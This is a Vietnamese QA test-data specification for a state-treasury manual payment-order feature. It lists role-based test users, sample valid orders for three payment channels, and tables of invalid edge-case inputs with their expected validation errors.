# 08 — Test Data: FT-001 — PAY.OUT.MANUAL

**Ma tinh nang:** FT-001
**Ten tai lieu:** Du lieu test (Test Data) cho PAY.OUT.MANUAL
**Phien ban:** 1.0 (MVP)
**Ngay tao:** 2026-05-19
**Nguoi soan:** QA Agent
**Tham chieu:** `bdd-01-create.md`, `02-design.md`, `03-schema.sql`

---

## 1. Tai khoan User Test (Test User Accounts)

### 1.1. Tai khoan chinh (Primary Test Users)

| Ma user (userId) | Username   | Vai tro (role) | Ma quyen (permission) | Ma KBNN (kbnnId) | Ghi chu                           |
| ---------------- | ---------- | -------------- | --------------------- | ---------------- | --------------------------------- |
| `USR-MAKER-001`  | maker01    | MAKER          | `PAY_OUT_MAKER`       | `KBHN`           | Maker chinh — dung cho happy path |
| `USR-MAKER-002`  | maker02    | MAKER          | `PAY_OUT_MAKER`       | `KBHN`           | Maker phu — dung cho SoD testing  |
| `USR-CHK-001`    | checker01  | CHECKER        | `PAY_OUT_CHECKER`     | `KBHN`           | Checker chinh                     |
| `USR-APR-001`    | approver01 | APPROVER       | `PAY_OUT_APPROVER`    | `KBHN`           | Approver chinh                    |
| `USR-VIEW-001`   | viewer01   | VIEWER         | `PAY_OUT_VIEWER`      | `KBHN`           | Viewer — chi xem, khong thao tac  |

### 1.2. Tai khoan phu (Auxiliary Test Users)

| Ma user (userId) | Username     | Vai tro (role)         | Ma quyen (permission)                | Ma KBNN (kbnnId) | Ghi chu                                      |
| ---------------- | ------------ | ---------------------- | ------------------------------------ | ---------------- | -------------------------------------------- |
| `USR-CHK-002`    | checker02    | CHECKER                | `PAY_OUT_CHECKER`                    | `KBHN`           | Checker phu — dung cho Approver SoD testing  |
| `USR-APR-002`    | approver02   | APPROVER               | `PAY_OUT_APPROVER`                   | `KBHN`           | Approver phu                                 |
| `USR-MIX-001`    | multirole01  | MAKER + CHECKER        | `PAY_OUT_MAKER`, `PAY_OUT_CHECKER`   | `KBHN`           | User co nhieu vai tro — test RBAC + SoD edge |
| `USR-MAKER-KB2`  | maker_kb2    | MAKER                  | `PAY_OUT_MAKER`                      | `KBHCM`          | Maker KBNN khac — test multi-tenant          |
| `USR-CHK-KB2`    | checker_kb2  | CHECKER                | `PAY_OUT_CHECKER`                    | `KBHCM`          | Checker KBNN khac                            |
| `USR-APR-KB2`    | approver_kb2 | APPROVER               | `PAY_OUT_APPROVER`                   | `KBHCM`          | Approver KBNN khac                           |
| `USR-NO-ROLE`    | norole01     | (khong co role FT-001) | —                                    | `KBHN`           | User co SSO nhung khong co quyen PAY.OUT     |
| `USR-PII-001`    | pii_viewer   | VIEWER                 | `PAY_OUT_VIEWER`, `PAY_OUT_VIEW_PII` | `KBHN`           | Viewer co quyen xem PII                      |
| `USR-NO-PII`     | no_pii_view  | VIEWER                 | `PAY_OUT_VIEWER`                     | `KBHN`           | Viewer khong co quyen PII — test masking     |

---

## 2. Du lieu Lenh hop le (Valid Order Data per Channel)

### 2.1. Lenh Lien ngan hang (LNH) — Day du truong

#### Header (`LTT_PAY_ORDER`)

| Truong (Column)         | Gia tri                                       | Ghi chu                              |
| ----------------------- | --------------------------------------------- | ------------------------------------ |
| `ID`                    | `a1b2c3d4-e5f6-7890-abcd-ef0123456789`        | UUID v4                              |
| `VERSION`               | `1`                                           | F-VER ban dau                        |
| `STATUS`                | `DRAFT`                                       |                                      |
| `REF_NO`                | `KBHN-202605-000001`                          | Auto-gen pattern                     |
| `CHANNEL`               | `LNH`                                         | Lien ngan hang                       |
| `ORDER_TYPE`            | `LENH_CHUYEN_KHOAN`                           | Bat buoc khi channel != LIEN_KHO_BAC |
| `LNH_TRANSACTION_TYPE`  | `LTT03`                                       | Lenh chuyen Co GT thap               |
| `SENDER`                | `BANK_001`                                    | BIDV                                 |
| `RECEIVER`              | `BANK_002`                                    | Vietcombank                          |
| `PAYMENT_DATE`          | `2026-05-19`                                  | Trong ky OPEN 05/2026                |
| `AMOUNT`                | `100000000.00`                                | 100 trieu VND                        |
| `CURRENCY_CODE`         | `VND`                                         |                                      |
| `EXCHANGE_RATE`         | `NULL`                                        | Khong can khi VND                    |
| `ORIGIN_NUM`            | `NULL`                                        | Khong bat buoc khi LNH               |
| `TRANSACTION_DATE`      | `NULL`                                        | Khong bat buoc khi LNH               |
| `EXP_TYPE`              | `NULL`                                        |                                      |
| `FN_CODE1`              | `NULL`                                        |                                      |
| `FN_CODE2`              | `NULL`                                        |                                      |
| `FN_AMOUNT`             | `NULL`                                        |                                      |
| `DESCRIPTION`           | `Thanh toan chi thuong xuyen thang 05/2026`   |                                      |
| `SENDER_NAME`           | `KBNN Ha Noi`                                 |                                      |
| `SENDER_ADDRESS`        | `So 9, Ngo 42, Duong Hoang Quoc Viet, Ha Noi` |                                      |
| `SENDER_GL_SEGMENT2`    | `1111`                                        | TK tu nhien                          |
| `SENDER_NUM`            | `KH001234`                                    | Ma khach hang                        |
| `SENDER_BANK_CODE`      | `BANK_001`                                    | BIDV                                 |
| `SENDER_IDENTIFY_ID`    | `001234567890`                                | CCCD                                 |
| `SENDER_ISSUED_DATE`    | `2020-01-15`                                  | Bat buoc vi co IDENTIFY_ID           |
| `SENDER_ISSUED_PLACE`   | `Cong an TP Ha Noi`                           | Bat buoc vi co IDENTIFY_ID           |
| `TPCP_CODE`             | `NULL`                                        |                                      |
| `RECEIVER_NAME`         | `So Tai chinh TP Ha Noi`                      |                                      |
| `RECEIVER_ADDRESS`      | `So 1, Duong Thanh Nien, Ha Noi`              |                                      |
| `RECEIVER_GL_SEGMENT2`  | `2222`                                        | So tai khoan nguoi nhan              |
| `RECEIVER_BANK_CODE`    | `BANK_002`                                    | Vietcombank                          |
| `RECEIVER_ACCOUNT_NAME` | `So Tai chinh TP Ha Noi - TK 2222`            |                                      |
| `RECEIVER_IDENTIFY_ID`  | `NULL`                                        | Khong nhap                           |
| `RECEIVER_ISSUED_DATE`  | `NULL`                                        |                                      |
| `RECEIVER_ISSUED_PLACE` | `NULL`                                        |                                      |
| `KBNN_ID`               | `KBHN`                                        |                                      |
| `CREATED_BY`            | `USR-MAKER-001`                               | maker01                              |
| `CREATED_AT`            | `2026-05-19T09:00:00+07:00`                   |                                      |
| `CREATED_IP`            | `10.0.1.100`                                  |                                      |
| `CHECKER_ID`            | `NULL`                                        | Chua co Checker action               |
| `APPROVER_ID`           | `NULL`                                        | Chua co Approver action              |
| `DELETE_REASON`         | `NULL`                                        |                                      |
| `IDEMPOTENCY_KEY`       | `idem-lnh-001-abc`                            |                                      |

#### Chi tiet khoan muc (`LTT_PAY_ORDER_LINE`) — 2 dong

| Truong             | Dong 1                                                    | Dong 2                                                    |
| ------------------ | --------------------------------------------------------- | --------------------------------------------------------- |
| `ID`               | `line-001-aaaa`                                           | `line-001-bbbb`                                           |
| `ORDER_ID`         | `a1b2c3d4-e5f6-...`                                       | `a1b2c3d4-e5f6-...`                                       |
| `LINE_NO`          | `1`                                                       | `2`                                                       |
| `GL_SEGMENT1`      | `01`                                                      | `01`                                                      |
| `GL_SEGMENT2`      | `1111`                                                    | `1121`                                                    |
| `GL_SEGMENT3`      | `1000001`                                                 | `1000001`                                                 |
| `GL_SEGMENT4`      | `01`                                                      | `01`                                                      |
| `GL_SEGMENT5`      | `000`                                                     | `000`                                                     |
| `GL_SEGMENT6`      | `000`                                                     | `000`                                                     |
| `GL_SEGMENT7`      | `0000`                                                    | `0000`                                                    |
| `GL_SEGMENT8`      | `00000`                                                   | `00000`                                                   |
| `GL_SEGMENT9`      | `00000`                                                   | `00000`                                                   |
| `GL_SEGMENT10`     | `00`                                                      | `00`                                                      |
| `GL_SEGMENT11`     | `0000`                                                    | `0000`                                                    |
| `GL_SEGMENT12`     | `000`                                                     | `000`                                                     |
| `CCID_KEY`         | `01-1111-1000001-01-000-000-0000-00000-00000-00-0000-000` | `01-1121-1000001-01-000-000-0000-00000-00000-00-0000-000` |
| `LINE_DESCRIPTION` | `Chi phi van hanh phong ban A`                            | `Chi phi van hanh phong ban B`                            |
| `LINE_AMOUNT`      | `60000000.00`                                             | `40000000.00`                                             |

**Kiem tra:** SUM(LINE_AMOUNT) = 60,000,000 + 40,000,000 = 100,000,000 = AMOUNT (khớp tuyệt doi)

---

### 2.2. Lenh Thanh toan song phuong (TTSP) — co ORIGIN_NUM va TRANSACTION_DATE

#### Header (`LTT_PAY_ORDER`)

| Truong (Column)         | Gia tri                                       | Ghi chu                            |
| ----------------------- | --------------------------------------------- | ---------------------------------- |
| `ID`                    | `b2c3d4e5-f6a7-8901-bcde-f01234567890`        | UUID v4                            |
| `VERSION`               | `1`                                           |                                    |
| `STATUS`                | `DRAFT`                                       |                                    |
| `REF_NO`                | `KBHN-202605-000002`                          |                                    |
| `CHANNEL`               | `TTSP`                                        | Thanh toan song phuong             |
| `ORDER_TYPE`            | `LENH_THONG_THUONG`                           | Bat buoc khi channel=TTSP          |
| `LNH_TRANSACTION_TYPE`  | `NULL`                                        | Chi hop le khi channel=LNH         |
| `SENDER`                | `BANK_001`                                    |                                    |
| `RECEIVER`              | `BANK_003`                                    | NH nuoc ngoai — test receiver khac |
| `PAYMENT_DATE`          | `2026-05-15`                                  | Trong ky 05/2026                   |
| `AMOUNT`                | `250000000.00`                                | 250 trieu VND                      |
| `CURRENCY_CODE`         | `USD`                                         | Ngoai te                           |
| `EXCHANGE_RATE`         | `25500.000000`                                | Bat buoc khi currency != VND       |
| `ORIGIN_NUM`            | `CT-2026-05-00123`                            | Bat buoc khi channel=TTSP          |
| `TRANSACTION_DATE`      | `2026-05-14`                                  | Bat buoc khi channel=TTSP          |
| `EXP_TYPE`              | `NULL`                                        |                                    |
| `FN_CODE1`              | `NULL`                                        |                                    |
| `FN_CODE2`              | `NULL`                                        |                                    |
| `FN_AMOUNT`             | `NULL`                                        |                                    |
| `DESCRIPTION`           | `Thanh toan hop dich vu tu van thang 05/2026` |                                    |
| `SENDER_NAME`           | `KBNN Ha Noi`                                 |                                    |
| `SENDER_ADDRESS`        | `So 9, Ngo 42, Duong Hoang Quoc Viet, Ha Noi` |                                    |
| `SENDER_GL_SEGMENT2`    | `1111`                                        |                                    |
| `SENDER_NUM`            | `NULL`                                        |                                    |
| `SENDER_BANK_CODE`      | `BANK_001`                                    |                                    |
| `SENDER_IDENTIFY_ID`    | `NULL`                                        |                                    |
| `SENDER_ISSUED_DATE`    | `NULL`                                        |                                    |
| `SENDER_ISSUED_PLACE`   | `NULL`                                        |                                    |
| `TPCP_CODE`             | `NULL`                                        |                                    |
| `RECEIVER_NAME`         | `Cong ty tu van ABC`                          |                                    |
| `RECEIVER_ADDRESS`      | `Tang 10, Toa nha Keangnam, Ha Noi`           |                                    |
| `RECEIVER_GL_SEGMENT2`  | `3333`                                        |                                    |
| `RECEIVER_BANK_CODE`    | `BANK_003`                                    |                                    |
| `RECEIVER_ACCOUNT_NAME` | `Cong ty tu van ABC - TK 3333`                |                                    |
| `RECEIVER_IDENTIFY_ID`  | `0100123456`                                  | Ma doanh nghiep                    |
| `RECEIVER_ISSUED_DATE`  | `2018-06-20`                                  | Bat buoc vi co IDENTIFY_ID         |
| `RECEIVER_ISSUED_PLACE` | `So Ke hoach va Dau tu TP Ha Noi`             | Bat buoc vi co IDENTIFY_ID         |
| `KBNN_ID`               | `KBHN`                                        |                                    |
| `CREATED_BY`            | `USR-MAKER-001`                               |                                    |
| `CREATED_AT`            | `2026-05-19T10:30:00+07:00`                   |                                    |
| `CREATED_IP`            | `10.0.1.100`                                  |                                    |
| `CHECKER_ID`            | `NULL`                                        |                                    |
| `APPROVER_ID`           | `NULL`                                        |                                    |
| `IDEMPOTENCY_KEY`       | `idem-ttsp-002-def`                           |                                    |

#### Chi tiet khoan muc — 1 dong

| Truong             | Gia tri                                                     |
| ------------------ | ----------------------------------------------------------- |
| `ID`               | `line-002-aaaa`                                             |
| `ORDER_ID`         | `b2c3d4e5-f6a7-...`                                         |
| `LINE_NO`          | `1`                                                         |
| `GL_SEGMENT1`      | `01`                                                        |
| `GL_SEGMENT2`      | `2411`                                                      |
| `GL_SEGMENT3`      | `1000001`                                                   |
| `GL_SEGMENT4`      | `NULL`                                                      |
| `GL_SEGMENT5`      | `000`                                                       |
| `GL_SEGMENT6`      | `000`                                                       |
| `GL_SEGMENT7`      | `3110`                                                      |
| `GL_SEGMENT8`      | `00001`                                                     |
| `GL_SEGMENT9`      | `00000`                                                     |
| `GL_SEGMENT10`     | `00`                                                        |
| `GL_SEGMENT11`     | `0000`                                                      |
| `GL_SEGMENT12`     | `000`                                                       |
| `CCID_KEY`         | `01-2411-1000001-NULL-000-000-3110-00001-00000-00-0000-000` |
| `LINE_DESCRIPTION` | `Phi tu van du an X`                                        |
| `LINE_AMOUNT`      | `250000000.00`                                              |

---

### 2.3. Lenh Lien kho bac (LIEN_KHO_BAC) — Khong co ORDER_TYPE, toi thieu truong

#### Header (`LTT_PAY_ORDER`)

| Truong (Column)         | Gia tri                                       | Ghi chu                                            |
| ----------------------- | --------------------------------------------- | -------------------------------------------------- |
| `ID`                    | `c3d4e5f6-a7b8-9012-cdef-012345678901`        | UUID v4                                            |
| `VERSION`               | `1`                                           |                                                    |
| `STATUS`                | `DRAFT`                                       |                                                    |
| `REF_NO`                | `KBHN-202605-000003`                          |                                                    |
| `CHANNEL`               | `LIEN_KHO_BAC`                                | Lien kho bac                                       |
| `ORDER_TYPE`            | `NULL`                                        | Phai NULL khi channel=LIEN_KHO_BAC (CK constraint) |
| `LNH_TRANSACTION_TYPE`  | `NULL`                                        | Chi hop le khi LNH                                 |
| `SENDER`                | `BANK_001`                                    |                                                    |
| `RECEIVER`              | `BANK_001`                                    | Cung ngan hang, KB khac                            |
| `PAYMENT_DATE`          | `2026-05-19`                                  |                                                    |
| `AMOUNT`                | `50000000.00`                                 | 50 trieu VND                                       |
| `CURRENCY_CODE`         | `VND`                                         |                                                    |
| `EXCHANGE_RATE`         | `NULL`                                        |                                                    |
| `ORIGIN_NUM`            | `NULL`                                        |                                                    |
| `TRANSACTION_DATE`      | `NULL`                                        |                                                    |
| `EXP_TYPE`              | `NULL`                                        |                                                    |
| `FN_CODE1`              | `NULL`                                        |                                                    |
| `FN_CODE2`              | `NULL`                                        |                                                    |
| `FN_AMOUNT`             | `NULL`                                        |                                                    |
| `DESCRIPTION`           | `Chuyen tien lien kho bac quy 1 - quy 2`      |                                                    |
| `SENDER_NAME`           | `KBNN Ha Noi`                                 |                                                    |
| `SENDER_ADDRESS`        | `So 9, Ngo 42, Duong Hoang Quoc Viet, Ha Noi` |                                                    |
| `SENDER_GL_SEGMENT2`    | `1111`                                        |                                                    |
| `SENDER_NUM`            | `NULL`                                        |                                                    |
| `SENDER_BANK_CODE`      | `BANK_001`                                    |                                                    |
| `SENDER_IDENTIFY_ID`    | `NULL`                                        |                                                    |
| `SENDER_ISSUED_DATE`    | `NULL`                                        |                                                    |
| `SENDER_ISSUED_PLACE`   | `NULL`                                        |                                                    |
| `TPCP_CODE`             | `NULL`                                        |                                                    |
| `RECEIVER_NAME`         | `KBNN TP Ho Chi Minh`                         |                                                    |
| `RECEIVER_ADDRESS`      | `So 6, Duong Nguyen Thi Minh Khai, TP HCM`    |                                                    |
| `RECEIVER_GL_SEGMENT2`  | `4444`                                        |                                                    |
| `RECEIVER_BANK_CODE`    | `BANK_001`                                    |                                                    |
| `RECEIVER_ACCOUNT_NAME` | `KBNN TP HCM - TK 4444`                       |                                                    |
| `RECEIVER_IDENTIFY_ID`  | `NULL`                                        |                                                    |
| `RECEIVER_ISSUED_DATE`  | `NULL`                                        |                                                    |
| `RECEIVER_ISSUED_PLACE` | `NULL`                                        |                                                    |
| `KBNN_ID`               | `KBHN`                                        |                                                    |
| `CREATED_BY`            | `USR-MAKER-001`                               |                                                    |
| `CREATED_AT`            | `2026-05-19T14:00:00+07:00`                   |                                                    |
| `CREATED_IP`            | `10.0.1.100`                                  |                                                    |
| `CHECKER_ID`            | `NULL`                                        |                                                    |
| `APPROVER_ID`           | `NULL`                                        |                                                    |
| `IDEMPOTENCY_KEY`       | `idem-lkb-003-ghi`                            |                                                    |

#### Chi tiet khoan muc — 1 dong

| Truong             | Gia tri                                                   |
| ------------------ | --------------------------------------------------------- |
| `ID`               | `line-003-aaaa`                                           |
| `ORDER_ID`         | `c3d4e5f6-a7b8-...`                                       |
| `LINE_NO`          | `1`                                                       |
| `GL_SEGMENT1`      | `01`                                                      |
| `GL_SEGMENT2`      | `1111`                                                    |
| `GL_SEGMENT3`      | `1000001`                                                 |
| `GL_SEGMENT4`      | `01`                                                      |
| `GL_SEGMENT5`      | `000`                                                     |
| `GL_SEGMENT6`      | `000`                                                     |
| `GL_SEGMENT7`      | `0000`                                                    |
| `GL_SEGMENT8`      | `00000`                                                   |
| `GL_SEGMENT9`      | `00000`                                                   |
| `GL_SEGMENT10`     | `00`                                                      |
| `GL_SEGMENT11`     | `0000`                                                    |
| `GL_SEGMENT12`     | `000`                                                     |
| `CCID_KEY`         | `01-1111-1000001-01-000-000-0000-00000-00000-00-0000-000` |
| `LINE_DESCRIPTION` | `Chuyen tien noi bo lien kho bac`                         |
| `LINE_AMOUNT`      | `50000000.00`                                             |

---

### 2.4. Lenh LNH voi ngoai te va LNH_TRANSACTION_TYPE GT cao (AMOUNT >= 500 trieu)

#### Header — truong dieu kien co giao dich ngoai te

| Truong (Column)         | Gia tri                                       | Ghi chu                                |
| ----------------------- | --------------------------------------------- | -------------------------------------- |
| `ID`                    | `d4e5f6a7-b8c9-0123-defa-123456789012`        |                                        |
| `VERSION`               | `1`                                           |                                        |
| `STATUS`                | `DRAFT`                                       |                                        |
| `REF_NO`                | `KBHN-202605-000004`                          |                                        |
| `CHANNEL`               | `LNH`                                         |                                        |
| `ORDER_TYPE`            | `TT_BANG_NGOAI_TE_KHAC`                       | Lenh TT bang ngoai te khac             |
| `LNH_TRANSACTION_TYPE`  | `LTT04`                                       | Lenh chuyen Co GT cao (>=500tr VND)    |
| `SENDER`                | `BANK_001`                                    |                                        |
| `RECEIVER`              | `BANK_004`                                    |                                        |
| `PAYMENT_DATE`          | `2026-05-19`                                  |                                        |
| `AMOUNT`                | `600000000.00`                                | 600 trieu VND (> 500tr → GT cao)       |
| `CURRENCY_CODE`         | `EUR`                                         |                                        |
| `EXCHANGE_RATE`         | `28000.500000`                                | Bat buoc vi EUR != VND                 |
| `ORIGIN_NUM`            | `NULL`                                        |                                        |
| `TRANSACTION_DATE`      | `NULL`                                        |                                        |
| `EXP_TYPE`              | `EXP03`                                       | Bat buoc khi TT ngoai te khac          |
| `FN_CODE1`              | `EUR`                                         | Bat buoc khi TT ngoai te khac          |
| `FN_CODE2`              | `VND`                                         | Bat buoc khi TT ngoai te khac          |
| `FN_AMOUNT`             | `21428.57`                                    | 600,000,000 / 28,000.5 ≈ 21,428.57 EUR |
| `DESCRIPTION`           | `Thanh toan dich vu chuyen gia nuoc ngoai Q2` |                                        |
| `SENDER_NAME`           | `KBNN Ha Noi`                                 |                                        |
| `SENDER_ADDRESS`        | `So 9, Ngo 42, Duong Hoang Quoc Viet, Ha Noi` |                                        |
| `SENDER_GL_SEGMENT2`    | `1111`                                        |                                        |
| `SENDER_NUM`            | `NULL`                                        |                                        |
| `SENDER_BANK_CODE`      | `BANK_001`                                    |                                        |
| `SENDER_IDENTIFY_ID`    | `NULL`                                        |                                        |
| `SENDER_ISSUED_DATE`    | `NULL`                                        |                                        |
| `SENDER_ISSUED_PLACE`   | `NULL`                                        |                                        |
| `TPCP_CODE`             | `NULL`                                        |                                        |
| `RECEIVER_NAME`         | `To chuc Y te Quoc te WHO`                    |                                        |
| `RECEIVER_ADDRESS`      | `Ave. Appia 20, 1211 Geneva, Switzerland`     |                                        |
| `RECEIVER_GL_SEGMENT2`  | `5555`                                        |                                        |
| `RECEIVER_BANK_CODE`    | `BANK_004`                                    |                                        |
| `RECEIVER_ACCOUNT_NAME` | `WHO Vietnam Office - EUR Account`            |                                        |
| `RECEIVER_IDENTIFY_ID`  | `NULL`                                        |                                        |
| `RECEIVER_ISSUED_DATE`  | `NULL`                                        |                                        |
| `RECEIVER_ISSUED_PLACE` | `NULL`                                        |                                        |
| `KBNN_ID`               | `KBHN`                                        |                                        |
| `CREATED_BY`            | `USR-MAKER-001`                               |                                        |
| `CREATED_AT`            | `2026-05-19T15:00:00+07:00`                   |                                        |
| `CREATED_IP`            | `10.0.1.100`                                  |                                        |
| `IDEMPOTENCY_KEY`       | `idem-lnh-eur-004-jkl`                        |                                        |

---

## 3. Du lieu khong hop le — Edge Cases (Invalid Data)

### 3.1. Thieu truong bat buoc (Missing Required Fields)

| Ma TC    | Truong bi thieu             | Gia tri gui len         | Loi mong doi                | Message code       |
| -------- | --------------------------- | ----------------------- | --------------------------- | ------------------ |
| `INV-01` | `CHANNEL`                   | `NULL`                  | Chan submit, highlight do   | `MSG-ERR-REQUIRED` |
| `INV-02` | `SENDER`                    | `NULL`                  | Chan submit, highlight do   | `MSG-ERR-REQUIRED` |
| `INV-03` | `RECEIVER`                  | `NULL`                  | Chan submit, highlight do   | `MSG-ERR-REQUIRED` |
| `INV-04` | `PAYMENT_DATE`              | `NULL`                  | Chan submit, highlight do   | `MSG-ERR-REQUIRED` |
| `INV-05` | `AMOUNT`                    | `NULL`                  | Chan submit, highlight do   | `MSG-ERR-REQUIRED` |
| `INV-06` | `DESCRIPTION`               | `''` (rong)             | Chan submit, highlight do   | `MSG-ERR-REQUIRED` |
| `INV-07` | `REF_NO`                    | `NULL`                  | Chan submit, highlight do   | `MSG-ERR-REQUIRED` |
| `INV-08` | `SENDER_NAME`               | `NULL`                  | Chan submit, highlight do   | `MSG-ERR-REQUIRED` |
| `INV-09` | `SENDER_ADDRESS`            | `NULL`                  | Chan submit, highlight do   | `MSG-ERR-REQUIRED` |
| `INV-10` | `RECEIVER_NAME`             | `NULL`                  | Chan submit, highlight do   | `MSG-ERR-REQUIRED` |
| `INV-11` | `RECEIVER_ACCOUNT_NAME`     | `NULL`                  | Chan submit, highlight do   | `MSG-ERR-REQUIRED` |
| `INV-12` | `SENDER_GL_SEGMENT2`        | `NULL`                  | Chan submit, highlight do   | `MSG-ERR-REQUIRED` |
| `INV-13` | `RECEIVER_GL_SEGMENT2`      | `NULL`                  | Chan submit, highlight do   | `MSG-ERR-REQUIRED` |
| `INV-14` | `SENDER_BANK_CODE`          | `NULL`                  | Chan submit, highlight do   | `MSG-ERR-REQUIRED` |
| `INV-15` | `RECEIVER_BANK_CODE`        | `NULL`                  | Chan submit, highlight do   | `MSG-ERR-REQUIRED` |
| `INV-16` | `ORDER_TYPE` khi LNH        | `NULL` + `CHANNEL=LNH`  | Chan submit (CK constraint) | `MSG-ERR-REQUIRED` |
| `INV-17` | `ORDER_TYPE` khi TTSP       | `NULL` + `CHANNEL=TTSP` | Chan submit (CK constraint) | `MSG-ERR-REQUIRED` |
| `INV-18` | `ORIGIN_NUM` khi TTSP       | `NULL` + `CHANNEL=TTSP` | Chan submit                 | `MSG-ERR-REQUIRED` |
| `INV-19` | `TRANSACTION_DATE` khi TTSP | `NULL` + `CHANNEL=TTSP` | Chan submit                 | `MSG-ERR-REQUIRED` |
| `INV-20` | `LINE_AMOUNT` (dong 1)      | `NULL`                  | Chan submit                 | `MSG-ERR-REQUIRED` |
| `INV-21` | `GL_SEGMENT2` (line)        | `NULL`                  | Chan submit                 | `MSG-ERR-REQUIRED` |
| `INV-22` | `GL_SEGMENT3` (line)        | `NULL`                  | Chan submit                 | `MSG-ERR-REQUIRED` |
| `INV-23` | `LINE_DESCRIPTION`          | `NULL`                  | Chan submit                 | `MSG-ERR-REQUIRED` |

### 3.2. AMOUNT am / bang khong / khong hop le

| Ma TC    | Truong        | Gia tri gui len | Loi mong doi                  | Message code    |
| -------- | ------------- | --------------- | ----------------------------- | --------------- |
| `INV-30` | `AMOUNT`      | `-1000000.00`   | DB reject (CK constraint > 0) | `MSG-ERR-RANGE` |
| `INV-31` | `AMOUNT`      | `0`             | DB reject (CK constraint > 0) | `MSG-ERR-RANGE` |
| `INV-32` | `AMOUNT`      | `0.00`          | DB reject (CK constraint > 0) | `MSG-ERR-RANGE` |
| `INV-33` | `LINE_AMOUNT` | `-500000.00`    | DB reject (CK constraint > 0) | `MSG-ERR-RANGE` |
| `INV-34` | `LINE_AMOUNT` | `0`             | DB reject (CK constraint > 0) | `MSG-ERR-RANGE` |

### 3.3. Amount mismatch — header khac tong lines

| Ma TC    | Mo ta                          | AMOUNT header | SUM(LINE_AMOUNT)          | Loi mong doi              | Message code              |
| -------- | ------------------------------ | ------------- | ------------------------- | ------------------------- | ------------------------- |
| `INV-40` | Lech nho (chanh 1 dong)        | `1000000.00`  | `900000.00` (1 dong 900k) | Chan submit, highlight do | `MSG-ERR-AMOUNT-MISMATCH` |
| `INV-41` | Lech lon                       | `1000000.00`  | `500000.00`               | Chan submit               | `MSG-ERR-AMOUNT-MISMATCH` |
| `INV-42` | Header nho hon tong lines      | `1000000.00`  | `1500000.00`              | Chan submit               | `MSG-ERR-AMOUNT-MISMATCH` |
| `INV-43` | Khong co dong nao (lines rong) | `1000000.00`  | `0` (khong co line)       | Chan submit               | `MSG-ERR-AMOUNT-MISMATCH` |

### 3.4. EXCHANGE_RATE thieu khi ngoai te

| Ma TC    | Mo ta                             | CURRENCY_CODE | EXCHANGE_RATE | Loi mong doi                  | Message code          |
| -------- | --------------------------------- | ------------- | ------------- | ----------------------------- | --------------------- |
| `INV-50` | Ngoai te khong co ty gia          | `USD`         | `NULL`        | DB reject (CK constraint)     | `MSG-ERR-REQUIRED`    |
| `INV-51` | Ngoai te ty gia = 0               | `EUR`         | `0`           | DB reject (CK > 0)            | `MSG-ERR-RANGE`       |
| `INV-52` | Ngoai te ty gia am                | `USD`         | `-25500.00`   | DB reject (CK > 0)            | `MSG-ERR-RANGE`       |
| `INV-53` | VND ma lai co ty gia (hop le DB?) | `VND`         | `23000.00`    | DB reject (CK: VND phai NULL) | `MSG-ERR-CROSS-FIELD` |

### 3.5. PAYMENT_DATE ngoai ky OPEN

| Ma TC    | Mo ta                        | PAYMENT_DATE | Ky OPEN   | Loi mong doi        | Message code     |
| -------- | ---------------------------- | ------------ | --------- | ------------------- | ---------------- |
| `INV-60` | Qua khu (ky da CLOSED)       | `01/01/2024` | `05/2026` | Chan submit         | `MSG-ERR-RANGE`  |
| `INV-61` | Qua khu (thang truoc)        | `30/04/2026` | `05/2026` | Chan submit         | `MSG-ERR-RANGE`  |
| `INV-62` | Tuong lai xa (ky chua mo)    | `01/06/2026` | `05/2026` | Chan submit         | `MSG-ERR-RANGE`  |
| `INV-63` | Dung dinh dang (chu thay so) | `32/13/2025` | `05/2026` | Chan, loi dinh dang | `MSG-ERR-FORMAT` |
| `INV-64` | Dung dinh dang (thang 13)    | `01/13/2026` | `05/2026` | Chan, loi dinh dang | `MSG-ERR-FORMAT` |

### 3.6. DELETE_REASON / ly do tra lai / tu choi qua ngan (< 10 ky tu)

| Ma TC    | Truong / Boi canh           | Gia tri gui len      | Loi mong doi            | Message code          |
| -------- | --------------------------- | -------------------- | ----------------------- | --------------------- |
| `INV-70` | `DELETE_REASON`             | `Sai so` (8 ky tu)   | Chan xoa (CK 10-500)    | `MSG-ERR-DELETE-CFM`  |
| `INV-71` | `DELETE_REASON`             | `""` (rong)          | Chan xoa                | `MSG-ERR-DELETE-CFM`  |
| `INV-72` | `DELETE_REASON`             | `Qua ngan` (9 ky tu) | Chan xoa (CK >= 10)     | `MSG-ERR-DELETE-CFM`  |
| `INV-73` | `CHECKER_COMMENT` (return)  | `Sai roi` (7 ky tu)  | Chan return (CK 10-500) | `MSG-ERR-CROSS-FIELD` |
| `INV-74` | `CHECKER_COMMENT` (reject)  | `Loi` (3 ky tu)      | Chan reject (CK 10-500) | `MSG-ERR-CROSS-FIELD` |
| `INV-75` | `APPROVER_COMMENT` (return) | `Can sua` (7 ky tu)  | Chan return             | `MSG-ERR-CROSS-FIELD` |
| `INV-76` | `APPROVER_COMMENT` (reject) | `Khong` (5 ky tu)    | Chan reject             | `MSG-ERR-CROSS-FIELD` |

> **Gia tri hop le (du 10 ky tu):** `"Sai so tien, can sua lai"` (23 ky tu), `"Khong hop le do thieu chung tu du"` (34 ky tu)

### 3.7. Gia tri CHANNEL khong hop le

| Ma TC    | Truong    | Gia tri gui len  | Loi mong doi              | Message code       |
| -------- | --------- | ---------------- | ------------------------- | ------------------ |
| `INV-80` | `CHANNEL` | `BANKING`        | DB reject (CK constraint) | `MSG-ERR-LOOKUP`   |
| `INV-81` | `CHANNEL` | `LNH_OLD`        | DB reject (CK constraint) | `MSG-ERR-LOOKUP`   |
| `INV-82` | `CHANNEL` | `''` (rong)      | DB reject (NOT NULL)      | `MSG-ERR-REQUIRED` |
| `INV-83` | `CHANNEL` | `lien_ngan_hang` | DB reject (CK constraint) | `MSG-ERR-LOOKUP`   |

### 3.8. LNH_TRANSACTION_TYPE khong hop le cho channel != LNH

| Ma TC    | Mo ta                                     | CHANNEL        | LNH_TRANSACTION_TYPE | Loi mong doi                                        | Message code       |
| -------- | ----------------------------------------- | -------------- | -------------------- | --------------------------------------------------- | ------------------ |
| `INV-90` | LNH_TRANSACTION_TYPE khi TTSP             | `TTSP`         | `LTT01`              | DB reject (CK constraint)                           | `MSG-ERR-LOOKUP`   |
| `INV-91` | LNH_TRANSACTION_TYPE khi LIEN_KHO_BAC     | `LIEN_KHO_BAC` | `LTT03`              | DB reject (CK constraint)                           | `MSG-ERR-LOOKUP`   |
| `INV-92` | LNH_TRANSACTION_TYPE gia tri khong hop le | `LNH`          | `LTT99`              | DB reject (CK constraint)                           | `MSG-ERR-LOOKUP`   |
